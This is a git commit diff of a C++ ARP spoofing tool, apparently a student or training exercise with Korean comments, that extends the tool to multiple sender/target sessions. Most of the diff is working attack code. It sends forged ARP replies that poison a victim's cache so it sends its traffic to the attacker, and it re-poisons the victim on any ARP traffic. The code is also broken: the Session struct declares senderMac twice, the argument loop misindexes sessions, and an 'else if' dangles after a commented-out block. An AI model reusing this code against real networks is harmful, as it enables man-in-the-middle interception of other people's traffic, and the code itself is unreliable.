d55ea6b9998a832b6f6bc63d7fd81d20146e37bb
rltjfkrhgo <rltjfkrhgo@hanmail.net>
2020-08-13 18:04:30 +0900

    0813 1804

--- arp-spoof-main.cpp
+++ arp-spoof-main.cpp
@@ -13,6 +13,96 @@ struct EthArpPacket {
 };
 #pragma pack(pop)
 
+struct Session
+{
+    Ip   senderIp;
+    Mac  senderMac;
+    Ip   targetIp;
+    Mac  senderMac;
+
+    // sender를 속이는 변조된 arp패킷
+    // 지속적으로 감염을 시켜야 하므로 구조체 안에 만들었다.
+    EthArpPacket arpInfectPacket;
+};
+
+Mac myMac;
+Ip myIp;
+
+// senderIp를 주면 ARP리퀘스트를 통하여 senderMac을 반환한다.
+Mac requestMac(pcap_t* handle, Ip senderIp)
+{
+    // ARP Request 패킷 제작
+    EthArpPacket arpRequestPacket;
+
+    arpRequestPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
+    arpRequestPacket.eth_.smac_ = myMac;
+    arpRequestPacket.eth_.type_ = htons(EthHdr::Arp);
+
+    arpRequestPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
+    arpRequestPacket.arp_.pro_ = htons(EthHdr::Ip4);
+    arpRequestPacket.arp_.hln_ = Mac::SIZE;
+    arpRequestPacket.arp_.pln_ = Ip::SIZE;
+    arpRequestPacket.arp_.op_ = htons(ArpHdr::Request);  // 리퀘스트
+    arpRequestPacket.arp_.smac_ = myMac;
+    arpRequestPacket.arp_.sip_ = htonl(myIp);
+    arpRequestPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
+    arpRequestPacket.arp_.tip_ = htonl(senderIp);
+
+    // ARP Request 패킷 전송
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpRequestPacket), sizeof(EthArpPacket));
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    }
+
+    // ARP Reply 패킷 수신
+    EthArpPacket* recvPacket = nullptr;
+    
+    while(true)
+    {
+        struct pcap_pkthdr* header;
+        const  u_char*      packet;
+        int res = pcap_next_ex(handle, &header, &packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) {
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+            break;
+        }
+        
+        recvPacket = (EthArpPacket*)packet;  // 패킷을 가져와서
+        
+        if(recvPacket->eth_.type() != EthHdr::Arp)
+            continue;  // ARP패킷이 아니면 건너 뛴다.
+        if(recvPacket->arp_.op() != ArpHdr::Reply)
+            continue;  // ARP Reply가 아니면 건너 뛴다.
+        if(recvPacket->arp_.sip() != senderIp)
+            continue;  // sender IP가 아니면 건너 뛴다.
+        
+        break;  // 찾았다!!
+    }
+
+    // senderMac 겟또
+    return Mac(recvPacket->arp_.smac_);
+}
+
+// session구조체 내의 arpInfectPacket을 지지고 볶고 해서 만든다.
+void makeArpInfectPacket(Session* session)
+{
+    // ARP infect 패킷 제작
+    session->arpInfectPacket.eth_.dmac_ = session->senderMac;
+    session->arpInfectPacket.eth_.smac_ = myMac;
+    session->arpInfectPacket.eth_.type_ = htons(EthHdr::Arp);
+
+    session->arpInfectPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
+    session->arpInfectPacket.arp_.pro_ = htons(EthHdr::Ip4);
+    session->arpInfectPacket.arp_.hln_ = Mac::SIZE;
+    session->arpInfectPacket.arp_.pln_ = Ip::SIZE;
+    session->arpInfectPacket.arp_.op_ = htons(ArpHdr::Reply);  // 리플라이
+    session->arpInfectPacket.arp_.smac_ = myMac;
+    session->arpInfectPacket.arp_.sip_ = htonl(session->targetIp);  // 내가 target이다...
+    session->arpInfectPacket.arp_.tmac_ = session->senderMac;
+    session->arpInfectPacket.arp_.tip_ = htonl(session->senderIp);
+}
+
 void usage() {
     printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
     printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
@@ -45,42 +135,50 @@ int main(int argc, char* argv[]) {
         fprintf(stderr, "get_ip_addr() Error!!\n");
         return -1;
     }
-    Mac myMac = Mac(myMacStr);
-    Ip myIp = Ip(myIpStr);
-    
-    // 공격 준비
+    myMac = Mac(myMacStr);
+    myIp = Ip(myIpStr);
 
-    Ip senderIp = Ip(argv[2]);
-    Ip targetIp = Ip(argv[3]);
-    
-    // sender의 MAC주소 알아오기
-    
-    // ARP Request 패킷 제작
-    EthArpPacket arpRequestPacket;
 
-    arpRequestPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
-    arpRequestPacket.eth_.smac_ = myMac;
-    arpRequestPacket.eth_.type_ = htons(EthHdr::Arp);
+    int numOfSession = (argc-2) / 2;
 
-    arpRequestPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
-    arpRequestPacket.arp_.pro_ = htons(EthHdr::Ip4);
-    arpRequestPacket.arp_.hln_ = Mac::SIZE;
-    arpRequestPacket.arp_.pln_ = Ip::SIZE;
-    arpRequestPacket.arp_.op_ = htons(ArpHdr::Request);  // 리퀘스트
-    arpRequestPacket.arp_.smac_ = myMac;
-    arpRequestPacket.arp_.sip_ = htonl(myIp);
-    arpRequestPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
-    arpRequestPacket.arp_.tip_ = htonl(senderIp);
-
-    // 패킷 전송
-    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpRequestPacket), sizeof(EthArpPacket));
-    if (res != 0) {
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    // 세션 배열 할당
+    Session* session = new Session[numOfSession];
+    if(session == nullptr)
+    {
+        fprintf(stderr, "Out of Memory!!\n");
+        return -1;
     }
 
-    // ARP Reply 패킷 수신
-    EthArpPacket* recvPacket = NULL;
+    // 세션 IP 입력
+    for(int i = 0; i < numOfSession; i+=2)
+    {
+        session[i].senderIp = Ip(argv[i+2]);
+        session[i].targetIp = Ip(argv[i+3]);
+    }
     
+    // sender의 MAC주소 알아오기
+    // 그리고 ARP infect 패킷 생성
+    for(int i = 0; i < numOfSession; i++)
+    {
+        session[i].senderMac = requestMac(handle, session[i].senderIp);
+        makeArpInfectPacket(&session[i]);
+    }
+    
+    // 모든 준비는 끝났다!!
+
+    // ARP infect 패킷 전송
+    for(int i = 0; i < numOfSession; i++)
+    {
+        int res = pcap_sendpacket(
+            handle, 
+            reinterpret_cast<const u_char*>( &(session[i].arpInfectPacket) ), 
+            sizeof(EthArpPacket));
+        if (res != 0) {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        }
+    }
+
+    // relay while loop
     while(true)
     {
         struct pcap_pkthdr* header;
@@ -91,94 +189,57 @@ int main(int argc, char* argv[]) {
             printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
             break;
         }
-        
-        recvPacket = (EthArpPacket*)packet;  // 패킷을 가져와서
-        
-        if(recvPacket->eth_.type() != EthHdr::Arp)
-            continue;  // ARP패킷이 아니면 건너 뛴다.
-        if(recvPacket->arp_.op() != ArpHdr::Reply)
-            continue;  // ARP Reply가 아니면 건너 뛴다.
-        if(recvPacket->arp_.sip() != senderIp)
-            continue;  // sender IP가 아니면 건너 뛴다.
-        
-        break;  // 찾았다!!
-    }
-    
-    // senderMac 겟또
-    Mac senderMac = Mac(recvPacket->arp_.smac_);
-
-    // ARP infect 패킷 제작
-    EthArpPacket arpInfectPacket;
-
-    arpInfectPacket.eth_.dmac_ = senderMac;
-    arpInfectPacket.eth_.smac_ = myMac;
-    arpInfectPacket.eth_.type_ = htons(EthHdr::Arp);
-
-    arpInfectPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
-    arpInfectPacket.arp_.pro_ = htons(EthHdr::Ip4);
-    arpInfectPacket.arp_.hln_ = Mac::SIZE;
-    arpInfectPacket.arp_.pln_ = Ip::SIZE;
-    arpInfectPacket.arp_.op_ = htons(ArpHdr::Reply);  // 리플라이
-    arpInfectPacket.arp_.smac_ = myMac;
-    arpInfectPacket.arp_.sip_ = htonl(targetIp);  // 내가 target이다...
-    arpInfectPacket.arp_.tmac_ = senderMac;
-    arpInfectPacket.arp_.tip_ = htonl(senderIp);
-    
-    // ARP infect 패킷 전송
-    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpInfectPacket), sizeof(EthArpPacket));
-    if (res != 0) {
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-    }
-
-    // relay while loop
-    while(true)
-    {
-        struct pcap_pkthdr* header;
-        const  u_char*      packet;
-        int res = pcap_next_ex(handle, &header, &packet);
-        if (res == 0)
-        {
-            printf("nothing captured...\n");
-            continue;
-        }
-
-        if (res == -1 || res == -2) {
-            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-            break;
-        }
 
         // 패킷을 가져와서
         EthHdr*      spoofedPacket = (EthHdr*)packet;
         bpf_u_int32  spoofedPacketSize = header->caplen;
 
-        if(spoofedPacket->smac() != senderMac)
-            continue;  // sender의 MAC이 아니면 건너뛴다!
-
-        // IP패킷이면 Relay!!
-        if(spoofedPacket->type() == EthHdr::Ip4)
+        // 패킷 하나를 두고 세션 모두와 비교한다.
+        for(int i = 0; i < numOfSession; i++)
         {
-            printf("from %s, spoofed IP packet is captured: %u bytes \n", targetIp, spoofedPacketSize);
+            if(spoofedPacket->smac() != session[i].senderMac)
+                continue;  // sender의 MAC이 아니면 건너뛴다!
 
-            // src mac을 나의 MAC으로 바꾼다.
-            spoofedPacket->smac_ = myMac;
+            if(spoofedPacket->dmac() != myMac)
+                continue;  // 나한테 온게 아니면 건너뛴다!
 
-            // 릴레이 IP패킷 전송
-            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(spoofedPacket), spoofedPacketSize);
-            if (res != 0) {
-                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+            // IP패킷이면 Relay!!
+            /*
+            if(spoofedPacket->type() == EthHdr::Ip4)
+            {
+                printf("from %s, spoofed IP packet is captured: %u bytes \n", session[i].senderIp, spoofedPacketSize);
+
+                // src mac을 나의 MAC으로 바꾼다.
+                spoofedPacket->smac_ = myMac;
+
+                // 릴레이 IP패킷 전송
+                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(spoofedPacket), spoofedPacketSize);
+                if (res != 0) {
+                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                }
+            }*/
+
+            // ARP패킷이면
+            else if(spoofedPacket->type() == EthHdr::Arp)
+            {
+                // 다시한번 ARP infect 패킷 전송
+                res = pcap_sendpacket(
+                    handle,
+                    reinterpret_cast<const u_char*>( &(session[i].arpInfectPacket) ),
+                    sizeof(EthArpPacket));
+                if (res != 0) {
+                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                }
             }
-        }
 
-        // ARP패킷이면
-        else if(spoofedPacket->type() == EthHdr::Arp)
-        {
-            // 다시한번 ARP infect 패킷 전송
-            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpInfectPacket), sizeof(EthArpPacket));
-            if (res != 0) {
-                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-            }
         }
-    }  // relay while loop
+        // for loop
+
+    }
+    // relay while loop
+
+    delete[] session;
+    session = nullptr;
 
     pcap_close(handle);
 }
